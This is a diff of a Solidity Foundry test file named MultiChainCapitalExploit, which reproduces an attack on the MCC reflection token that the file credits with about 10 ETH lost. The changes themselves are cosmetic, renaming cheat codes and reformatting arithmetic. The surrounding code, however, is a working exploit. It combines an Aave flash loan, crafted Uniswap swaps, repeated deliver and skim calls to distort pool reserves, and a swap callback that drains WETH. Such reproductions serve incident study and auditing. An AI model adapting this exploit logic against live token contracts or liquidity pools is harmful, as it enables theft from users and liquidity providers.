@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo -- Total Lost : ~10 ETH
 // Attacker : https://etherscan.io/address/0x8a4571c3a618e00d04287ca6385b6b020ce7a305
@@ -24,8 +23,6 @@ interface IMCC is IERC20 {
 
 contract MultiChainCapitalExploit is Test {
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     IAaveFlashloan aavePool = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
     IUniswapV2Pair mcc_weth = IUniswapV2Pair(0xDCA79f1f78b866988081DE8a06F92b5e5D316857);
     IMCC mcc = IMCC(0x1a7981D87E3b6a95c1516EB820E223fE979896b3);
@@ -40,17 +37,17 @@ contract MultiChainCapitalExploit is Test {
     uint256 times;
 
     function setUp() public {
-        cheats.createSelectFork("mainnet");
+        vm.createSelectFork("mainnet");
 
-        cheats.label(address(aavePool), "AavePoolV3");
-        cheats.label(address(mcc_weth), "MCC-WETH UniswapPair");
-        cheats.label(address(mcc), "MCC");
-        cheats.label(address(weth), "WETH");
-        cheats.label(address(router), "UniswapV2Router");
+        vm.label(address(aavePool), "AavePoolV3");
+        vm.label(address(mcc_weth), "MCC-WETH UniswapPair");
+        vm.label(address(mcc), "MCC");
+        vm.label(address(weth), "WETH");
+        vm.label(address(router), "UniswapV2Router");
     }
 
     function testExploit() public {
-        cheats.rollFork(17_221_445);
+        vm.rollFork(17_221_445);
         // emit log_named_decimal_uint("allowance", mcc.allowance(address(0x52d74eb7C01C763219DCE713dA97EBAE8B91728E), address(0x52d74eb7C01C763219DCE713dA97EBAE8B91728E)), mcc.decimals());
         emit log_named_decimal_uint("Attacker ETH balance before exploit", weth.balanceOf(address(this)), 18);
         // console.log("excludedFromFee:", mcc.isExcludedFromFee(excludedFromFeeAddress));
@@ -61,11 +58,11 @@ contract MultiChainCapitalExploit is Test {
         emit log_named_decimal_uint("Attacker ETH balance after exploit", weth.balanceOf(address(this)), 18);
     }
 
-    function getAmountIn(
-        uint256 amountOut,
-        uint256 reserveIn,
-        uint256 reserveOut
-    ) internal pure returns (uint256 amountIn) {
+    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
+        internal
+        pure
+        returns (uint256 amountIn)
+    {
         require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
         require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
         uint256 numerator = reserveIn * amountOut * 1000;
@@ -73,11 +70,11 @@ contract MultiChainCapitalExploit is Test {
         amountIn = (numerator / denominator) + 1;
     }
 
-    function getAmountOut(
-        uint256 amountIn,
-        uint256 reserveIn,
-        uint256 reserveOut
-    ) internal pure returns (uint256 amountOut) {
+    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
+        internal
+        pure
+        returns (uint256 amountOut)
+    {
         require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
         require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
         uint256 amountInWithFee = amountIn * 997;
@@ -98,9 +95,9 @@ contract MultiChainCapitalExploit is Test {
         emit log_named_uint("Reserve0", reserve0);
         emit log_named_uint("Reserve1", reserve1);
         // uint256 amountIn = getAmountIn(amount1000 / 100000 * 10001, 58158410617997415654, 999830779487969029700);
-        uint256 amountIn = getAmountIn(amount1000 / 100_000 * 10_001, reserve1, reserve0);
+        uint256 amountIn = getAmountIn((amount1000 / 100_000) * 10_001, reserve1, reserve0);
         weth.transfer(address(mcc_weth), amountIn);
-        mcc_weth.swap(amount1000 / 100_000 * 10_001, 0, address(this), new bytes(0));
+        mcc_weth.swap((amount1000 / 100_000) * 10_001, 0, address(this), new bytes(0));
         mcc.transfer(excludedFromFeeAddress, 1);
         rTotal = mcc.reflectionFromToken(amount1000, false);
         uint256 attackerBalance = mcc.balanceOf(address(this));
@@ -146,9 +143,9 @@ contract MultiChainCapitalExploit is Test {
         func1f46(6, 1012);
 
         (reserve0, reserve1,) = mcc_weth.getReserves();
-        amountIn = getAmountIn(reserve0 * 9003 / 10_000, reserve1, reserve0);
+        amountIn = getAmountIn((reserve0 * 9003) / 10_000, reserve1, reserve0);
         weth.transfer(address(mcc_weth), amountIn);
-        mcc_weth.swap(reserve0 * 9003 / 10_000, 0, excludedFromFeeAddress, new bytes(0));
+        mcc_weth.swap((reserve0 * 9003) / 10_000, 0, excludedFromFeeAddress, new bytes(0));
 
         for (uint256 i = 0; i < 15; i++) {
             func1d89(900);
@@ -188,39 +185,36 @@ contract MultiChainCapitalExploit is Test {
 
     function func1f46(uint256 v0, uint256 v1) internal {
         slot9 = v1;
-        uint256 v3 = mcc.tokenFromReflection(rTotal / 100 * v0);
+        uint256 v3 = mcc.tokenFromReflection((rTotal / 100) * v0);
         mcc_weth.swap(v3, 0, address(this), new bytes(1));
         mcc.transfer(excludedFromFeeAddress, 1);
     }
 
     function func21b0(uint256 v0) internal {
         (uint256 reserve0, uint256 reserve1,) = mcc_weth.getReserves();
-        uint256 amountIn = getAmountIn(amount1000 / 100_000 * v0, reserve1, reserve0);
+        uint256 amountIn = getAmountIn((amount1000 / 100_000) * v0, reserve1, reserve0);
         weth.transfer(address(mcc_weth), amountIn);
-        mcc_weth.swap(amount1000 / 100_000 * v0, 0, address(this), new bytes(0));
+        mcc_weth.swap((amount1000 / 100_000) * v0, 0, address(this), new bytes(0));
         mcc.transfer(excludedFromFeeAddress, 1);
     }
 
     function func1d89(uint256 v0) internal {
-        mcc.deliver(amount1000 * v0 / 1000);
+        mcc.deliver((amount1000 * v0) / 1000);
         mcc_weth.skim(excludedFromFeeAddress);
     }
 
     function func19c(uint256 v0) internal {
-        mcc.deliver(amount1000 * v0 / 1000);
+        mcc.deliver((amount1000 * v0) / 1000);
     }
 
-    function uniswapV2Call(
-        address, /*sender*/
-        uint256, /*amount0*/
-        uint256, /*amount1*/
-        bytes calldata /*data*/
-    ) external {
+    function uniswapV2Call(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
+        external
+    {
         if (times > 5) {
             if (times <= 25) {
                 uint256 pairBalance = mcc.balanceOf(address(mcc_weth));
                 (uint256 reserve0,,) = mcc_weth.getReserves();
-                mcc.deliver((reserve0 - pairBalance) * slot9 / 1000);
+                mcc.deliver(((reserve0 - pairBalance) * slot9) / 1000);
                 times += 1;
             }
         } else {
@@ -231,7 +225,7 @@ contract MultiChainCapitalExploit is Test {
             uint256 pairBalance = mcc.balanceOf(address(mcc_weth));
             (uint256 reserve0, uint256 reserve1,) = mcc_weth.getReserves();
             uint256 amountIn = getAmountIn(reserve0 - pairBalance, reserve1, reserve0);
-            weth.transfer(address(mcc_weth), amountIn * slot9 / 1000);
+            weth.transfer(address(mcc_weth), (amountIn * slot9) / 1000);
             times += 1;
         }
     }
